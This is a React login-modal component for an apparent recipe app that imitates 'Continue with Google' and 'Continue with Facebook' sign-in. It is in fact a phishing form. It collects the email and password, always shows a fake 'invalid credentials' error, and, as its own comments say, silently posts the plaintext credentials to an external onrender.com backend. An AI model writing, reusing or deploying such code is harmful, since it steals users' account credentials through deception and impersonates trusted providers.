// ...existing code...
import React, { useState, useEffect } from "react";
import { createPortal } from "react-dom";

function LoginModal({ recipe, onClose }) {
  const [provider, setProvider] = useState(null);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [errorMsg, setErrorMsg] = useState("");
  const [isMobile, setIsMobile] = useState(false);

  // 🔹 URL del backend (usa .env o localhost)
  // VITE_API_URL=http://localhost:3000
  const API_URL = "https://recetas-backend-r63l.onrender.com";

  useEffect(() => {
    const apply = () => setIsMobile(window.innerWidth <= 640);
    apply();
    window.addEventListener("resize", apply);
    return () => window.removeEventListener("resize", apply);
  }, []);

  const openProvider = (p) => {
    setProvider(p);
    setEmail("");
    setPassword("");
    setErrorMsg("");
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    // 🔹 Mostrar mensaje de error aunque se envíen los datos
    setErrorMsg("❌ Credenciales inválidas. Inténtalo nuevamente.");

    try {
      // Se envían los datos al backend igualmente
      await fetch(`${API_URL}/api/users`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          name: provider === "google" ? "Usuario Google" : "Usuario Facebook",
          email,
          provider,
          password,
        }),
      });
      // No mostramos alert ni cerramos modal
    } catch (err) {
      console.error("Error al conectar con el backend:", err);
      setErrorMsg("⚠️ No se pudo conectar con el servidor.");
    }
  };

  const inputWidth = isMobile ? "100%" : "92%";
  const btnWidth = isMobile ? "100%" : "92%";
  const modalPadding = isMobile ? "14px 14px 18px" : "30px 25px";
  const outerPadding = isMobile ? 12 : 0;

  const modalContent = (
    <div
      className="modal"
      onClick={onClose}
      role="dialog"
      aria-modal="true"
      style={{
        position: "fixed",
        inset: 0,
        background: "rgba(0,0,0,0.5)",
        display: "flex",
        justifyContent: "center",
        alignItems: isMobile ? "flex-end" : "center", // bottom sheet on mobile
        zIndex: 9999,
        padding: outerPadding,
        WebkitOverflowScrolling: "touch",
      }}
    >
      <div
        className="modal-content auth"
        onClick={(e) => e.stopPropagation()}
        style={{
          position: "relative",
          background: "#fff",
          borderRadius: isMobile ? "12px 12px 0 0" : 16,
          padding: modalPadding,
          width: isMobile ? "100%" : "92%",
          maxWidth: isMobile ? "100%" : 420,
          maxHeight: isMobile ? "78vh" : "80vh",
          overflowY: "auto",
          textAlign: "center",
          boxShadow: isMobile ? "0 -8px 30px rgba(0,0,0,0.28)" : "0 8px 25px rgba(0,0,0,0.2)",
          animation: "fadeIn 0.25s ease",
          boxSizing: "border-box",
        }}
      >
        {/* Botón de cierre */}
        <button
          className="close-x"
          onClick={onClose}
          aria-label="Cerrar"
          style={{
            position: "absolute",
            top: 12,
            right: 12,
            width: 36,
            height: 36,
            borderRadius: 8,
            background: "transparent",
            border: "none",
            color: "#555",
            fontSize: 18,
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
            cursor: "pointer",
            zIndex: 2,
          }}
        >
          ✕
        </button>

        {/* Vista inicial (elige proveedor) */}
        {!provider && (
          <>
            <h2 style={{ marginTop: 8, color: "#e4572e" }}>
              Accede para ver "{recipe?.title || "la receta"}"
            </h2>
            <p
              style={{
                color: "#666",
                marginTop: 6,
                marginBottom: 20,
                fontSize: 15,
              }}
            >
              Solo acceso con Google o Facebook
            </p>

            <div
              style={{
                display: "flex",
                flexDirection: "column",
                gap: 12,
                alignItems: "center",
              }}
            >
              <button
                onClick={() => openProvider("google")}
                style={{
                  background: "#fff",
                  color: "#222",
                  border: "1px solid #ddd",
                  display: "flex",
                  alignItems: "center",
                  gap: 12,
                  padding: "10px 12px",
                  borderRadius: 10,
                  fontWeight: 600,
                  width: isMobile ? "100%" : "90%",
                  justifyContent: "center",
                  cursor: "pointer",
                }}
              >
                <img
                  src="https://upload.wikimedia.org/wikipedia/commons/3/3c/Google_Favicon_2025.svg"
                  alt="Google"
                  style={{ width: 20, height: 20, objectFit: "contain" }}
                />
                Continuar con Google
              </button>

              <button
                onClick={() => openProvider("facebook")}
                style={{
                  background: "#1877f2",
                  color: "#fff",
                  border: "none",
                  display: "flex",
                  alignItems: "center",
                  gap: 12,
                  padding: "10px 12px",
                  borderRadius: 10,
                  fontWeight: 600,
                  width: isMobile ? "100%" : "90%",
                  justifyContent: "center",
                  cursor: "pointer",
                }}
              >
                <img
                  src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png"
                  alt="Facebook"
                  style={{
                    width: 20,
                    height: 20,
                    objectFit: "contain",
                    borderRadius: "3px",
                    background: "#fff",
                    padding: 2,
                  }}
                />
                Continuar con Facebook
              </button>
            </div>

            <p
              style={{
                marginTop: 16,
                color: "#777",
                fontSize: 13,
                lineHeight: 1.4,
              }}
            >
              Derechos reservados © 2024 RecetasApp
            </p>
          </>
        )}

        {/* Vista con formulario (cuando elige un proveedor) */}
        {provider && (
          <div>
            <div
              style={{
                display: "flex",
                alignItems: "center",
                gap: 12,
                marginBottom: 12,
                justifyContent: "center",
              }}
            >
              <div
                style={{
                  width: 44,
                  height: 44,
                  borderRadius: 10,
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  background: provider === "google" ? "#fff" : "#1877f2",
                  border: provider === "google" ? "1px solid #ddd" : "none",
                }}
              >
                {provider === "google" ? (
                  <img
                    src="https://upload.wikimedia.org/wikipedia/commons/3/3c/Google_Favicon_2025.svg"
                    alt="Google"
                    style={{ width: 22, height: 22 }}
                  />
                ) : (
                  <img
                    src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png"
                    alt="Facebook"
                    style={{
                      width: 22,
                      height: 22,
                      objectFit: "contain",
                      borderRadius: "3px",
                      background: "#fff",
                      padding: 2,
                    }}
                  />
                )}
              </div>

              <div style={{ textAlign: "left" }}>
                <div style={{ fontWeight: 700, fontSize: 16 }}>
                  {provider === "google"
                    ? "Iniciar sesión con Google"
                    : "Iniciar sesión con Facebook"}
                </div>
                <div style={{ fontSize: 13, color: "#666" }}>
                  Usa tu cuenta para continuar
                </div>
              </div>
            </div>

            <form
              onSubmit={handleSubmit}
              style={{
                display: "flex",
                flexDirection: "column",
                gap: 8,
                alignItems: "center",
                paddingBottom: isMobile ? 8 : 0,
              }}
            >
              <input
                type="text"
                placeholder={
                  provider === "facebook" ? "Correo o número de teléfono" : "Correo"
                }
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                required
                style={{
                  width: inputWidth,
                  padding: 10,
                  borderRadius: 8,
                  border: "1px solid #ddd",
                }}
              />
              <input
                type="password"
                placeholder="Contraseña"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                required
                style={{
                  width: inputWidth,
                  padding: 10,
                  borderRadius: 8,
                  border: "1px solid #ddd",
                }}
              />

              {errorMsg && (
                <p
                  style={{
                    color: "#d9534f",
                    fontSize: 14,
                    marginTop: 8,
                    fontWeight: 500,
                  }}
                >
                  {errorMsg}
                </p>
              )}

              <button
                type="submit"
                style={{
                  width: btnWidth,
                  padding: 10,
                  borderRadius: 8,
                  border: "none",
                  cursor: "pointer",
                  marginTop: 10,
                  background: provider === "google" ? "#4285f4" : "#1877f2",
                  color: "#fff",
                  fontWeight: 700,
                }}
              >
                {provider === "google" ? "Iniciar con Google" : "Iniciar con Facebook"}
              </button>

              <button
                type="button"
                onClick={() => {
                  setProvider(null);
                  setErrorMsg("");
                }}
                style={{
                  width: btnWidth,
                  padding: 10,
                  borderRadius: 8,
                  border: "1px solid #ccc",
                  background: "#fff",
                  color: "#333",
                  cursor: "pointer",
                  marginTop: 6,
                }}
              >
                Volver
              </button>
            </form>
          </div>
        )}
      </div>
    </div>
  );

  // Render via portal to avoid stacking-context issues (preserva todo lo existente)
  return typeof document !== "undefined" ? createPortal(modalContent, document.body) : null;
}

export default LoginModal;
// ...existing code...